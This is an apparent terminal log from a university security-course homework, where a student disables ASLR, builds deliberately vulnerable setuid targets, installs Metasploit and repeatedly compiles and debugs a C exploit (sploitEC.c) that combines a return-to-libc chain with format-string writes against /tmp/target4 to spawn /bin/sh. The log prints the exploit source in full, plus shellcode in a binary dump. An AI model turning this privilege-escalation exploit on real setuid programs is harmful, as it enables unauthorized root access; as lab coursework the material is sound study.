Setting up snapd (2.40) ...
Installing new version of config file /etc/apparmor.d/usr.lib.snapd.snap-confine.real ...
md5sum: /etc/apparmor.d/usr.lib.snapd.snap-confine: No such file or directory
snapd.failure.service is a disabled or a static unit, not starting it.
snapd.snap-repair.service is a disabled or a static unit, not starting it.
Setting up ubuntu-core-launcher (2.40) ...
Setting up keyboard-configuration (1.108ubuntu15.5) ...
update-rc.d: warning: start and stop actions are no longer supported; falling back to defaults
update-initramfs: deferring update (trigger activated)
Setting up console-setup-linux (1.108ubuntu15.5) ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-1.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-13.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-14.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-15.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-2.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-3.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-4.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-7.inc ...
Installing new version of config file /etc/console-setup/compose.ISO-8859-9.inc ...
Setting up console-setup (1.108ubuntu15.5) ...
Your console font configuration will be updated the next time your system
boots. If you want to update it now, run 'setupcon' from a virtual console.
update-initramfs: deferring update (trigger activated)
Setting up iproute2 (4.3.0-1ubuntu3.16.04.5) ...
Setting up libisc-export160 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libdns-export162 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up resolvconf (1.78ubuntu7) ...
Setting up rsyslog (8.16.0-1ubuntu3.1) ...
Installing new version of config file /etc/logrotate.d/rsyslog ...
The user `syslog' is already a member of `adm'.
Skipping profile in /etc/apparmor.d/disable: usr.sbin.rsyslogd
Setting up ureadahead (0.100.0-19.1) ...
Setting up ubuntu-minimal (1.361.4) ...
Setting up apt-transport-https (1.2.32) ...
Setting up libisc160:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libdns162:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libisccc140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libisccfg140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libbind9-140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up liblwres141:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up bind9-host (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up dnsutils (1:9.10.3.dfsg.P4-8ubuntu1.15) ...
Setting up libldap-2.4-2:i386 (2.4.42+dfsg-2ubuntu3.7) ...
Setting up lshw (02.17-1.1ubuntu3.6) ...
Setting up psmisc (22.21-2.1ubuntu0.1) ...
Setting up python-apt-common (1.1.0~beta1ubuntu0.16.04.5) ...
Setting up python3-apt (1.1.0~beta1ubuntu0.16.04.5) ...
Setting up python3-aptdaemon (1.1.1+bzr982-0ubuntu14.1) ...
Setting up aptdaemon-data (1.1.1+bzr982-0ubuntu14.1) ...
Setting up python3-aptdaemon.gtk3widgets (1.1.1+bzr982-0ubuntu14.1) ...
Setting up aptdaemon (1.1.1+bzr982-0ubuntu14.1) ...
Setting up python3-aptdaemon.pkcompat (1.1.1+bzr982-0ubuntu14.1) ...
Setting up ubuntu-standard (1.361.4) ...
Setting up libdpkg-perl (1.18.4ubuntu1.6) ...
Setting up dpkg-dev (1.18.4ubuntu1.6) ...
Setting up libdfu1:i386 (0.8.3-0ubuntu5) ...
Setting up libfwupd1:i386 (0.8.3-0ubuntu5) ...
Setting up fwupd (0.8.3-0ubuntu5) ...
Setting up gnome-software-common (3.20.5-0ubuntu0.16.04.12) ...
Setting up libsnapd-glib1:i386 (1.49-0ubuntu0.16.04.0) ...
Setting up gnome-software (3.20.5-0ubuntu0.16.04.12) ...
Setting up ubuntu-software (3.20.5-0ubuntu0.16.04.12) ...
Setting up libsnmp-base (5.7.3+dfsg-1ubuntu4.4) ...
Setting up libsnmp30:i386 (5.7.3+dfsg-1ubuntu4.4) ...
Setting up unity-services (7.4.5+16.04.20190312-0ubuntu1) ...
Setting up unity-schemas (7.4.5+16.04.20190312-0ubuntu1) ...
Setting up libunity-core-6.0-9:i386 (7.4.5+16.04.20190312-0ubuntu1) ...
Setting up unity (7.4.5+16.04.20190312-0ubuntu1) ...
Setting up linux-libc-dev:i386 (4.4.0-170.199) ...
Setting up python3-software-properties (0.96.20.9) ...
Setting up software-properties-common (0.96.20.9) ...
Setting up software-properties-gtk (0.96.20.9) ...
Setting up unattended-upgrades (1.1ubuntu1.18.04.7~16.04.4) ...
Installing new version of config file /etc/kernel/postinst.d/unattended-upgrades ...
Installing new version of config file /etc/pm/sleep.d/10_unattended-upgrades-hibernate ...
Setting up usb-creator-common (0.3.2ubuntu16.04.2) ...
Setting up usb-creator-gtk (0.3.2ubuntu16.04.2) ...
Setting up python3-distupgrade (1:16.04.29) ...
Setting up python3-update-manager (1:16.04.17) ...
Setting up ubuntu-release-upgrader-core (1:16.04.29) ...
Installing new version of config file /etc/update-manager/meta-release ...
Setting up update-manager-core (1:16.04.17) ...
Setting up ubuntu-release-upgrader-gtk (1:16.04.29) ...
Setting up update-manager (1:16.04.17) ...
Processing triggers for gconf2 (3.2.6-3ubuntu6) ...
Processing triggers for initramfs-tools (0.122ubuntu8.16) ...
update-initramfs: Generating /boot/initrd.img-4.15.0-70-generic
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Processing triggers for resolvconf (1.78ubuntu7) ...
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
The program 'curl' is currently not installed. You can install it by typing:
sudo apt install curl
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt install curl
Reading package lists... Done
Building dependency tree... 50%
Building dependency tree       
Reading state information... Done
The following package was automatically installed and is no longer required:
  snapd-login-service
Use 'sudo apt autoremove' to remove it.
The following NEW packages will be installed:
  curl
0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.
Need to get 142 kB of archives.
After this operation, 336 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 curl i386 7.47.0-1ubuntu2.14 [142 kB]
Fetched 142 kB in 0s (674 kB/s)
Selecting previously unselected package curl.
(Reading database ... 218315 files and directories currently installed.)
Preparing to unpack .../curl_7.47.0-1ubuntu2.14_i386.deb ...
Unpacking curl (7.47.0-1ubuntu2.14) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up curl (7.47.0-1ubuntu2.14) ...
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5495  100  5495    0     0  13705      0 --:--:-- --:--:-- --:--:-- 13703
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
msfinstall   sploit0    sploit1    sploit2    sploit3    sploit4    sploitEC
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ chmod 755 msfinstall
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ chmod 755 msfinstall
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./msfinstall 
Switching to root user to update the package
Adding metasploit-framework to your repository list..OK
Updating package cache..OK
Checking for and installing update..
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following package was automatically installed and is no longer required:
  snapd-login-service
Use 'sudo apt autoremove' to remove it.
The following NEW packages will be installed:
  metasploit-framework
0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.
Need to get 217 MB of archives.
After this operation, 477 MB of additional disk space will be used.
Get:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid/main i386 metasploit-framework i386 5.0.63+20191202112503~1rapid7-1 [217 MB]
Fetched 217 MB in 1min 52s (1,928 kB/s)                                                                    
Selecting previously unselected package metasploit-framework.
(Reading database ... 218322 files and directories currently installed.)
Preparing to unpack .../metasploit-framework_5.0.63+20191202112503~1rapid7-1_i386.deb ...
Unpacking metasploit-framework (5.0.63+20191202112503~1rapid7-1) ...
Setting up metasploit-framework (5.0.63+20191202112503~1rapid7-1) ...
update-alternatives: using /opt/metasploit-framework/bin/msfbinscan to provide /usr/bin/msfbinscan (msfbinscan) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfconsole to provide /usr/bin/msfconsole (msfconsole) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfd to provide /usr/bin/msfd (msfd) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfdb to provide /usr/bin/msfdb (msfdb) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfelfscan to provide /usr/bin/msfelfscan (msfelfscan) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfmachscan to provide /usr/bin/msfmachscan (msfmachscan) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfpescan to provide /usr/bin/msfpescan (msfpescan) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfrop to provide /usr/bin/msfrop (msfrop) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfrpc to provide /usr/bin/msfrpc (msfrpc) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfrpcd to provide /usr/bin/msfrpcd (msfrpcd) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfupdate to provide /usr/bin/msfupdate (msfupdate) in auto mode
update-alternatives: using /opt/metasploit-framework/bin/msfvenom to provide /usr/bin/msfvenom (msfvenom) in auto mode
Run msfconsole to get started
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ which msfelfscan 
/usr/bin/msfelfscan
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
msfinstall   sploit0    sploit1    sploit2    sploit3    sploit4    sploitEC
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ msfelfscan -p target4

 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.


Would you like to use and setup a new database (recommended)? N

 ** Metasploit Framework Initial Setup Complete **

[target4]
0x0804855a pop edi; pop ebp; ret
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
$ whoami
student
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /bin/sh
lrwxrwxrwx 1 root root 9 Dec  2 13:32 /bin/sh -> /bin/dash
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
$ whoami
student
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /tmp/
total 104
drwxrwxrwt 10 root root 4096 Dec  2 16:56 .
drwxr-xr-x 23 root root 4096 Nov 26 10:57 ..
drwxrwxrwt  2 root root 4096 Dec  2 16:16 .font-unix
drwxrwxrwt  2 root root 4096 Dec  2 16:16 .ICE-unix
drwx------  3 root root 4096 Dec  2 16:16 systemd-private-b19a63cb9e3a4fa5a3de342b811cef2c-colord.service-ryAbli
drwx------  3 root root 4096 Dec  2 16:16 systemd-private-b19a63cb9e3a4fa5a3de342b811cef2c-rtkit-daemon.service-VNAUZ1
drwx------  3 root root 4096 Dec  2 16:47 systemd-private-b19a63cb9e3a4fa5a3de342b811cef2c-systemd-timesyncd.service-oquMH5
-rwsr-xr-x  1 root root 8580 Dec  2 16:17 target0
-rwsr-xr-x  1 root root 9748 Dec  2 16:17 target1
-rwsr-xr-x  1 root root 9968 Dec  2 16:17 target2
-rwsr-xr-x  1 root root 9856 Dec  2 16:17 target3
-rwsr-xr-x  1 root root 9744 Dec  2 16:17 target4
drwxrwxrwt  2 root root 4096 Dec  2 16:16 .Test-unix
-r--r--r--  1 root root   11 Dec  2 16:16 .X0-lock
drwxrwxrwt  2 root root 4096 Dec  2 16:16 .X11-unix
drwxrwxrwt  2 root root 4096 Dec  2 16:16 .XIM-unix
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


11 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Dec  2 16:17:05 2019 from 10.0.2.2
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
msfinstall   sploit0    sploit1    sploit2    sploit3    sploit4    sploitEC
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) q
A debugging session is active.

	Inferior 1 [process 1306] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
msfinstall   sploit0    sploit1    sploit2    sploit3    sploit4    sploitEC
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEX
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
warning: Source file is more recent than executable.
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
process 1358 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 2 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 2, foo (
    temp=0xbfffff73 "AAAAAAAAp&\345\267[\205\004\b\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\354\375\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffb1
(gdb) Quitgetenv("shellcode")
(gdb) Quit
(gdb) q
A debugging session is active.

	Inferior 1 [process 1358] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
execve failed.
[Inferior 1 (process 1369) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
execve failed.
[Inferior 1 (process 1418) exited normally]
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
$ whoami
student
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) 
(gdb) c
Continuing.
process 1522 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe44) at target4.c:16
16	  if( argc != 2 )
(gdb) q
A debugging session is active.

	Inferior 1 [process 1522] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ lz
Reading directory of  standard input.
gzip: compressed data not read from a terminal. Use -f to force decompression.
For help, type: gzip -h
tar: This does not look like a tar archive
tar: Exiting with failure status due to previous errors
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
msfinstall   sploit0    sploit1    sploit2    sploit3    sploit4    sploitEC    sploitEX
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ rm sploitEX
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploitEC
ELF?4?!4 	($!444  TTT?	?    ????hhhDDP?td??,,Q?tdR??/lib/ld-linux.so.2GNU GNUM+??u?
                                                                                            ?
??@?? "8??K??@+Y G92??
                     llibc.so.6_IO_stdin_used__stack_chk_failmallocstderrexecvefwrite__libc_start_main__gmonr???rt__GLIBC_2.4GLIBC_2.0ii
   S???ß????????t?j?[??5??%
                           h??????%??????%h??????%h?????%h ?????%?f?1?^????PTRhPh?QVh?????f?f?f?f?f?f?f??$?f?f?f?f?f?f???-???v???tU???h??Ѓ???Ð?t&??-??????????t??tU???Ph??҃???Ít&??'?=?uU???|????????f?????u듍v???t?U???P?҃???u????L$????q?U??WQ??0e??E?1???
                                  j=???????E̋E̹?????¸?????ЍP??E???AAAA?@AAAA??E̹?????¸?????ЍP??E???p&??@?E̹?????¸?????ЍP??E???[?@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E???p&??@?E̹?????¸?????ЍP??E???[?@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E???????@?E̹?????¸?????ЍP??E????y??@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E????????@?E̹?????¸?????ЍP??E????????@?E?p?ẺE??E??E??EԈ?Eؒ?EЉE?EԉE?E؉E????E?P?E?Php?#???????Pjjh??????????}?e3=t?????e?Y_]?a??f?f?f?f??UWVS?'???????
                                                                                             ?l$ ??
                                                                                                   ????G???????)?????t%1??????t$,?t$,U?????????9?u??
                                        [^_]Ív??S???????ã?[?/tmp/target4thing=%5$njjjj=%5$nshellcode=/bin/shexecve failed.
(????D7???h<?????????zR|
                        ????F
                             J
                              tx?;*2$"4@?????D
                                              GuDuxu|??
                                                       A?A?C
                                                            Hx????]?A
                                                                     ?A?A?N i$D(D,A0M GA?A?
                                                                                           AA?????????
??                                                                                                   X?
???o?`Ё
|
 (0???o????o???o????^?1??F?F
                            ?
                             ???V
                                 ̀1ۉ?@̀?????/bin/sh1?1۰̀?^?1??F?F
                                                              ?
                                                               ???V
                                                                   ̀1ۉ?@̀?????/bin/shGCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609?\C
                              ??@?0?z??6in?7a??????oG???^?3?{??
                                                              P???e?@?? 	?$	??(	)?,	rb0?h4	Z8	?
                 Z<	?z@	?>D	LF	
                                                nG	?~H	?!?L	W)?T	^*?X	e+?\	l,?`	s.%?/Zh	*1?l
??
  ?Q?????1?
           ?~
             ?*
               ??
L                ?'
Z??
   u\	?uL++?uP3,?uT;-?uX$/uh
                              ?
                               ?
                                ?"
                                  ?-?@?
                                      ?C
                                        ?5?	3???h%

                                                      ;
                                                       I$

                                                         >
                                                          $

                                                           >




                                                           I

                                                            :
                                                             ;
:
 ;
  I8
:   	
 ;I8

:
 ;

  I
   !I/
.?:
   ;
    'I@?B4:
           ;
            I4:
               ;
/usr/lib/gcc/i686-linux-gnu/5/include/usr/include/i386-linux-gnu/bits/usr/includesploitEC.cstddef.htypes.hlibio.hshellcode.hstdio.h?
 
 ??0)))))))))))))ugvuuhY_quad_tresultsploitEC.c_IO_FILEenvp_IO_save_endshort intsize_tsizetype_IO_write_ptr_flags_IO_buf_base_markers_IO_read_endstderrlong long int_lock_cur_column_posshellcodeAlephOneshellcode_old_offsetunsigned charlong long unsigned int_IO_marker_shortbufargs_IO_write_base_unused2_IO_read_ptr_IO_buf_endmain_next__pad1__pad2__pad3__pad4__pad5short unsigned int_IO_write_end__off64_t_fileno/home/student/cs5435-fa19-hw4/sploits_chain__off_t_IO_backup_base_flags2_mode_IO_read_base_vtable_offset_IO_save_baseenvvar1envvar2envvar3GNU C11 5.4.0 20160609 -mtune=generic -march=i686 -ggdb -fstack-protector-strong_sbuf_IO_lock_tTh ?0?
X?
 ??
?Th???
    ? ???
         0.?D?S
               z?????@.??6????????
                                  ?&<PL h ?  ~???FT???? ? ?$l,>?]????NhU?a?f z?? HX?
                                                                                   crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7209__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrysploitEC.cshellcodeshellcodeAlephOne__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxstderr@@GLIBC_2.0_edata__stack_chk_fail@@GLIBC_2.4fwrite@@GLIBC_2.0malloc@@GLIBC_2.0__data_start__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0execve@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment.debug_aranges.debug_info.debug_abbrev.debug_line.debug_strT#hh 1??$D???o??$N
                                                         ??V``|^???o?k???o??0z	 ?	B00?XX#???`????b?T?hL??,????
       ?
       ?????? ?  ? 0?5
? 
  `%k?38?0??? J?#6	??student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploitEC.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  //char *env[1];

  // printf 0xb7e52670
  // RET 0x0804855b
  // envvar1 0xbfffffa2
  // execl 0xb7eb9a80
  // exit 0xb7e379d0
  // envvar2 0xbfffffb1
  // address 0xbffffdec

  char *result = malloc(8+13*4+1);
  strcat(result, "AAAAAAAA"); // stuff
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xa2\xff\xff\xbf"); // envar1
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xa2\xff\xff\xbf"); // envar2
  strcat(result, "\xa2\xff\xff\xbf"); // setuid
  strcat(result, "\xa2\xff\xff\xbf"); // placeholder1
  strcat(result, "\x80\x9a\xeb\xb7"); // execl
  strcat(result, "\xd0\x79\xe3\xb7"); // exit
  strcat(result, "\xb1\xff\xff\xbf"); // envar3
  strcat(result, "\xb1\xff\xff\xbf"); // envar3
  strcat(result, "\xec\xfd\xff\xbf"); // placeholder2

  args[0] = TARGET;
  args[1] = result; 
  args[2] = NULL;

  char *envvar1 = "thing=%5$n";
  char *envvar2 = "jjjj=%5$n";
  char *envvar3 = "shellcode=/bin/sh";
  
  char *envp[] =
    {
        envvar1,
        envvar2,
        envvar3
    };

  execve(TARGET, args, envp);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cat sploitEC.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  //char *env[1];

  // printf 0xb7e52670
  // RET 0x0804855b
  // envvar1 0xbfffffa2
  // execl 0xb7eb9a80
  // exit 0xb7e379d0
  // envvar2 0xbfffffb1
  // address 0xbffffdec

  char *result = malloc(8+13*4+1);
  strcat(result, "AAAAAAAA"); // stuff
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xa2\xff\xff\xbf"); // envar1
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xa2\xff\xff\xbf"); // envar2
  strcat(result, "\xa2\xff\xff\xbf"); // setuid
  strcat(result, "\xa2\xff\xff\xbf"); // placeholder1
  strcat(result, "\x80\x9a\xeb\xb7"); // execl
  strcat(result, "\xd0\x79\xe3\xb7"); // exit
  strcat(result, "\xb1\xff\xff\xbf"); // envar3
  strcat(result, "\xb1\xff\xff\xbf"); // envar3
  strcat(result, "\xec\xfd\xff\xbf"); // placeholder2

  args[0] = TARGET;
  args[1] = result; 
  args[2] = NULL;
  
  char *envp[] =
    {
        "thing=%5$n",
        "jjjj=%5$n",
        "shellcode=/bin/sh"
    };

  execve(TARGET, args, envp);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
